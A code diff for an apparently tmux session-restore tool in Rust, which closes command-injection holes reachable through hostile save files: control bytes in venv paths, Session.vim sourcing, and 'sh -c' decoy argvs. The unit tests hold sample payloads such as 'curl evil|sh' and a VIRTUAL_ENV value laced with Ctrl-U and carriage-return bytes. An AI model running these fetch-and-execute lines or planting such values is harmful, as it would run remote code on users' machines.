@@ -201,14 +201,28 @@ fn restore_session(
                         ));
                         continue;
                     }
-                    let target = format!("{win_target}.{}", pane.index);
-                    wait_for_shell(ctl, &target, &helper_name);
                     // Re-activate the captured venv/conda env first, if any, so
                     // the pre-typed command resolves the right interpreter.
                     let cmdline = match venv_activation(fg) {
                         Some(activate) => format!("{activate} && {}", shell_join(&fg.argv)),
                         None => shell_join(&fg.argv),
                     };
+                    // SECURITY: the activation prefix is built from fg.env
+                    // (VIRTUAL_ENV/CONDA_DEFAULT_ENV), which is attacker-
+                    // controlled in a hostile save and is NOT covered by the
+                    // is_safe_pretype(argv) check above. A control byte there
+                    // (Ctrl-U kill-line, CR accept-line) reaching `send-keys -l`
+                    // turns "text at the prompt" into "command executed". Re-
+                    // check the FULLY COMPOSED line before sending it.
+                    if !is_pretype_safe_str(&cmdline) {
+                        report.notes.push(format!(
+                            "refused to pre-type command with control characters in pane {}.{}",
+                            window.index, pane.index
+                        ));
+                        continue;
+                    }
+                    let target = format!("{win_target}.{}", pane.index);
+                    wait_for_shell(ctl, &target, &helper_name);
                     if let Err(e) = ctl.run(&["send-keys", "-t", &target, "-l", &cmdline]) {
                         report
                             .notes
@@ -332,28 +346,16 @@ fn spawn_command(
             argv.extend(recipe.iter().cloned());
         } else if wants_exec(fg, opts) {
             // Auto-restart a safe-listed program with its original argv.
+            //
+            // SECURITY: we deliberately do NOT auto-append `-S <cwd>/Session.vim`
+            // for vim/nvim. Session.vim runs arbitrary Ex commands, and from a
+            // save file there is no trustworthy signal that the file is benign:
+            // `fg.cwd` is manifest-controlled, so the former `fg.cwd == pane.cwd`
+            // guard compared two attacker-supplied fields (a no-op), and any
+            // regular file under $HOME (e.g. in a cloned repo) would be sourced.
+            // Session-restore is left to vim's own mechanisms.
             argv.push("--exec".into());
-            let mut exec_argv = fg.argv.clone();
-            // Editor state: vim/nvim resume a Session.vim from the program's
-            // cwd when present (auto-maintained by e.g. vim-obsession).
-            // SECURITY: Session.vim runs arbitrary Ex commands, so only trust
-            // one discovered in the PANE's own cwd (not a manifest-chosen
-            // directory), under $HOME, and reached without a symlink.
-            if matches!(effective_name(fg).as_str(), "vim" | "nvim" | "vi")
-                && !exec_argv.iter().any(|a| a == "-S")
-                && fg.cwd == pane.cwd
-                && home_dir().is_some_and(|h| fg.cwd.starts_with(&h))
-            {
-                let session_file = fg.cwd.join("Session.vim");
-                let is_regular = std::fs::symlink_metadata(&session_file)
-                    .map(|m| m.file_type().is_file())
-                    .unwrap_or(false);
-                if is_regular {
-                    exec_argv.push("-S".into());
-                    exec_argv.push(session_file.to_string_lossy().into_owned());
-                }
-            }
-            argv.extend(exec_argv);
+            argv.extend(fg.argv.iter().cloned());
         } else if !argv_has_denied(&fg.argv) && !opts.pretype_unrestored {
             // Servers, venv programs and unrestored commands are pre-typed
             // (see restore_session); note only when pre-type is off.
@@ -364,12 +366,6 @@ fn spawn_command(
         }
     }
     shell_join(&argv)
-}
-
-fn home_dir() -> Option<PathBuf> {
-    std::env::var_os("HOME")
-        .filter(|h| !h.is_empty())
-        .map(PathBuf::from)
 }
 
 /// Basename of a path token, lowercased (denylist/allow-list comparisons).
@@ -456,6 +452,73 @@ fn effective_name(fg: &FgProc) -> String {
     argv.get(i).map(|t| basename_lower(t)).unwrap_or_default()
 }
 
+/// Index of the real program after peeling only TRANSPARENT wrappers (env,
+/// nohup, `uv run`, npx, …) — the same set `effective_name` peels, but this one
+/// never descends into a `-c`/`-m` script. Used to decide authorization.
+fn program_head(argv: &[String]) -> usize {
+    let mut i = 0;
+    while let Some(tok) = argv.get(i) {
+        match basename_lower(tok).as_str() {
+            "nohup" | "setsid" | "stdbuf" | "time" | "nice" | "ionice" | "doas" | "catchsegv" => {
+                i += 1;
+                while argv.get(i).is_some_and(|t| t.starts_with('-')) {
+                    i += 1;
+                }
+            }
+            "env" => {
+                i += 1;
+                while let Some(t) = argv.get(i) {
+                    if t == "-u" || t == "-C" {
+                        i += 2;
+                    } else if t.starts_with('-') || t.contains('=') {
+                        i += 1;
+                    } else {
+                        break;
+                    }
+                }
+            }
+            "uv" | "poetry" | "pdm" | "rye" | "pipenv" | "hatch"
+                if argv.get(i + 1).map(String::as_str) == Some("run") =>
+            {
+                i += 2;
+            }
+            "npx" | "pnpx" | "bunx" => {
+                i += 1;
+                while argv.get(i).is_some_and(|t| t.starts_with('-')) {
+                    i += 1;
+                }
+            }
+            _ => break,
+        }
+    }
+    i
+}
+
+/// True if — after peeling wrappers — argv invokes an interpreter with an INLINE
+/// script/expression/module (`sh -c …`, `python -c/-m …`, `perl -e …`).
+///
+/// SECURITY: such an argv must never be auto-restarted. `effective_name` derives
+/// the safe-list name from the FIRST WORD INSIDE the script (`sh -c "htop; evil"`
+/// -> "htop"), but `--exec` runs the WHOLE original argv — so a safe-listed decoy
+/// word would authorize an arbitrary payload. These are offered via pre-type
+/// (which requires the user to press Enter) instead.
+fn carries_inline_script(argv: &[String]) -> bool {
+    let i = program_head(argv);
+    let Some(head) = argv.get(i).map(|t| basename_lower(t)) else {
+        return false;
+    };
+    let next = argv.get(i + 1).map(String::as_str);
+    match head.as_str() {
+        "sh" | "bash" | "zsh" | "dash" | "fish" | "ksh" | "csh" | "tcsh" | "ash" => {
+            next == Some("-c")
+        }
+        "python" | "python3" | "python2" | "perl" | "ruby" | "node" | "deno" | "php" | "lua" => {
+            matches!(next, Some("-c") | Some("-m") | Some("-e"))
+        }
+        _ => false,
+    }
+}
+
 /// Single-quote a value for a shell command (used to build activation prefixes).
 fn sh_quote(s: &str) -> String {
     format!("'{}'", s.replace('\'', r"'\''"))
@@ -491,7 +554,7 @@ fn is_server(fg: &FgProc) -> bool {
 
 /// The resume recipe (trusted user config) matching this pane, if any.
 fn resume_recipe<'a>(fg: &FgProc, opts: &'a RestoreOptions) -> Option<&'a Vec<String>> {
-    if argv_has_denied(&fg.argv) {
+    if argv_has_denied(&fg.argv) || carries_inline_script(&fg.argv) {
         return None;
     }
     let name = effective_name(fg);
@@ -522,6 +585,13 @@ fn restartable(fg: &FgProc, opts: &RestoreOptions) -> bool {
     if argv_has_denied(&fg.argv) {
         return false;
     }
+    // SECURITY: never auto-`--exec` an interpreter carrying an inline script;
+    // `effective_name` would authorize on a safe-listed decoy word INSIDE the
+    // script while the whole (arbitrary) script actually runs. Offer via
+    // pre-type instead (requires Enter, and is byte-checked).
+    if carries_inline_script(&fg.argv) {
+        return false;
+    }
     // Membership is tested against the UNWRAPPED program (uv run jupyter ->
     // jupyter), so wrapped invocations match the safe-list too.
     let eff = effective_name(fg);
@@ -534,8 +604,13 @@ fn restartable(fg: &FgProc, opts: &RestoreOptions) -> bool {
 /// accept-line, ESC, …) turns "text sitting at the prompt" into "command
 /// executed", so refuse to pre-type argv carrying them.
 fn is_safe_pretype(argv: &[String]) -> bool {
-    argv.iter()
-        .all(|a| a.bytes().all(|b| b >= 0x20 && b != 0x7f))
+    argv.iter().all(|a| is_pretype_safe_str(a))
+}
+
+/// A single string is safe to `send-keys -l`: no control byte that the pty line
+/// discipline / readline would act on (Ctrl-U kill-line, CR/LF accept-line, ESC).
+fn is_pretype_safe_str(s: &str) -> bool {
+    s.bytes().all(|b| b >= 0x20 && b != 0x7f)
 }
 
 /// Manifest session names reach tmux `-t` targets and `set-option`; tmux
@@ -774,6 +849,51 @@ mod tests {
             env: Vec::new(),
             listening: Vec::new(),
         }
+    }
+
+    #[test]
+    fn inline_script_runners_are_detected() {
+        // #2 crown jewel: an interpreter carrying an inline script/module.
+        assert!(carries_inline_script(&fgp(&["sh", "-c", "htop; curl evil|sh"]).argv));
+        assert!(carries_inline_script(&fgp(&["bash", "-c", "x"]).argv));
+        assert!(carries_inline_script(&fgp(&["python3", "-c", "import os"]).argv));
+        assert!(carries_inline_script(&fgp(&["python", "-m", "http.server"]).argv));
+        assert!(carries_inline_script(&fgp(&["node", "-e", "x"]).argv));
+        // …even hidden behind transparent wrappers.
+        assert!(carries_inline_script(&fgp(&["nohup", "sh", "-c", "x"]).argv));
+        assert!(carries_inline_script(&fgp(&["env", "A=b", "bash", "-c", "x"]).argv));
+        // Real programs and `run`-style wrappers are NOT inline scripts.
+        assert!(!carries_inline_script(&fgp(&["htop"]).argv));
+        assert!(!carries_inline_script(&fgp(&["uv", "run", "jupyter", "lab"]).argv));
+        assert!(!carries_inline_script(&fgp(&["python"]).argv)); // bare REPL
+    }
+
+    #[test]
+    fn sh_c_decoy_is_not_auto_restarted() {
+        // #2: `sh -c "htop; evil"` — effective_name says "htop" (safe-listed),
+        // but the whole script would run via --exec. Must NOT be restartable.
+        let mut o = opts();
+        o.programs = vec!["htop".into(), "sh".into()]; // even if sh is listed
+        // Space after the decoy so the first script word is exactly "htop".
+        let fg = fgp(&["sh", "-c", "htop -d 1; curl evil | sh"]);
+        assert_eq!(effective_name(&fg), "htop"); // the decoy the old check trusted
+        assert!(!restartable(&fg, &o));
+        assert!(!wants_exec(&fg, &o));
+        // and it is not smuggled into a resume recipe either.
+        o.resume = [("htop".into(), vec!["htop".into()])].into_iter().collect();
+        assert!(resume_recipe(&fg, &o).is_none());
+    }
+
+    #[test]
+    fn venv_control_bytes_fail_the_composed_pretype_check() {
+        // #1: a poisoned VIRTUAL_ENV yields an activation prefix that the
+        // argv-only is_safe_pretype misses but the composed-string check catches.
+        let mut fg = fgp(&["ipython"]);
+        assert!(is_safe_pretype(&fg.argv)); // argv alone looks clean
+        fg.env = vec![("VIRTUAL_ENV".into(), "\u{15}curl evil|sh\r#".into())];
+        let activate = venv_activation(&fg).unwrap();
+        let cmdline = format!("{activate} && {}", shell_join(&fg.argv));
+        assert!(!is_pretype_safe_str(&cmdline)); // the guard that now runs
     }
 
     #[test]
